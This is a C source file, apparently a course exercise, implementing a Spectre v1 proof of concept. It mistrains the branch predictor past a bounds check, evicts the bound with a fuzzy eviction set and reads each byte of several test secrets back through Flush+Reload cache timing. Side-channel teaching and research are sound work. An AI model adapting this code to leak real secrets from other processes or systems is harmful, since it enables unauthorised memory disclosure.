#include "utils.h"






// Default PoC

char *secret_default = "The cake is a lie!";


// super long secret
#define A16 "AAAAAAAAAAAAAAAA"
#define B16 "BBBBBBBBBBBBBBBB"
#define C16 "CCCCCCCCCCCCCCCC"
char secret_big[3 * CACHE_LINE_SIZE + 1]   __attribute__((aligned(CACHE_LINE_SIZE))) =
    A16 A16 A16 A16  //  64 'A'
    A16 A16 A16 A16  // 128 'A' total
    B16 B16 B16 B16  //  64 'B'
    B16 B16 B16 B16
    C16 C16 C16 C16
    C16 C16 C16 C16;


// Branchless select based on the predicate (covered in class)
 size_t cselect(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
    return (T & mask) | (F & ~mask);
}

// Find the most hit cacheline and safely decode its character
void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    uint64_t most_hits = 0, scd_most_hits = 0;
    unsigned char raw_c = '\0', scd_raw_c = '\0';
    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
        if (most_hits < hits[i]) {
            scd_most_hits = most_hits;
            scd_raw_c = raw_c;

            most_hits = hits[i];
            raw_c = i;
        }
    }

    *c = isprint(raw_c) ? raw_c : '?';
    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); "
           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n",
           *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
}




// ====== Below is a common Spectre "PoC" ======
uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
volatile int64_t array_size = 8;

int naive_victim(uint8_t *pages, size_t idx, size_t stride) {
    if (idx < array_size) {
        volatile uint8_t temp = *(pages+(*(array+idx) * stride));
    }
    return 0;
}


// this is done strictly so that I can change the form in which I have my secret
void naive_attacker(char *secret_address, bool atomic_counter){
    timer_init(true, 1, atomic_counter);
    uint64_t threshold = calibrate_latency(atomic_counter);
    find_fuzzy_eviction_set();
    printf("-----------------------------------------\n");
    
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[512] = { '\0' };


    // Pages for Flush+Reload
    uint8_t *pages = mmap(NULL, PAGE_SIZE_LOCAL * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }

    memset(pages, 1, PAGE_SIZE_LOCAL * SYMBOL_CNT);
    printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);
    size_t stride = PAGE_SIZE_LOCAL;

    size_t malicious_index = (uintptr_t)secret_address - (uintptr_t)array;
    printf("Secret address: %p, Array address: %p\n", secret_address, array);
    printf("The malicious index is %p-%p=%zu \n", secret_address, array,
           malicious_index);
    printf("-----------------------------------------\n");

    uint64_t fuzzy_evict_got_it_wrong = 0;
    for (size_t c = 0; c < strlen(secret_address); c++) {
        for (size_t r = 0; r < reps; r++) {
            for (size_t t = 0; t < mistrain; t++) {
                bool is_attack = (t % mistrain == mistrain - 1);
                size_t index = cselect(malicious_index + c, 0, is_attack);

                fuzzy_evict();
                __asm__ __volatile__("" ::: "memory");
                
                naive_victim(pages, index, stride);
            }

            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                uint8_t *ptr = pages + stride * idx;
                uint32_t time = timer_time_maccess(ptr, atomic_counter);
                // printf("Time: %d\n", time);
                hits[idx] += time < threshold;
            }
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits));
    }
    timer_shutdown(atomic_counter);
    printf("Recovered secret: \"%s\"\n", buf);
    munmap(pages, PAGE_SIZE_LOCAL * SYMBOL_CNT);


    return;
}

int main(int argc, char *argv[]){
    flush_whole_cache();
   
    char * test = (char *)malloc(19 * sizeof(char));
    strcpy(test, secret_default);
    size_t line_idx = 0;
    if (argc > 3) {
        line_idx = strtoul(argv[3], NULL, 0);
    }

    bool atomic_counter = strtoul(argv[1], NULL, 0);
    if(atomic_counter){
        printf("Using atomic counter\n");

    }
    else{
        printf("Using regular counter\n");
    }

    init_secret_on_page(line_idx, false);

    printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
    char *secret_ptr;
    int secret_to_use = strtoul(argv[2], NULL, 0);
    switch(secret_to_use)
    {
    case 0:
        secret_ptr = secret_default;
        printf("Using default secret\n");
        break;
    case 1:
        secret_ptr = secret_big;
        printf("Using big secret\n");
        printf("secret_big = %p, secret_big %% %d = %zu\n",
       (void*)secret_big, CACHE_LINE_SIZE,
       (size_t)secret_big % CACHE_LINE_SIZE);
        break;
    case 2:
        secret_ptr = secret_mmap;
        printf("Using mmap secret: %s\n", secret_ptr);
        break;
    case 3:
        secret_ptr = secret_big + CACHE_LINE_SIZE - 4;
        
        printf("Using big secret starting at cache-line crossing "
           "(offset %d -> last byte of line 0)\n", CACHE_LINE_SIZE - 4);
        printf("secret_big = %p, secret_big %% %d = %zu\n",
       (void*)secret_big, CACHE_LINE_SIZE,
       (size_t)secret_big % CACHE_LINE_SIZE);
        break;
    case 4:
        secret_ptr = test;
        printf("Using malloc secret\n");
        break;
    default:
        printf("Unsupported value\n");
        exit(1);
    }


    naive_attacker(secret_ptr, atomic_counter);



    if(secret_to_use == 2){
        destroy_secret_page();
    }

    return 0;
}

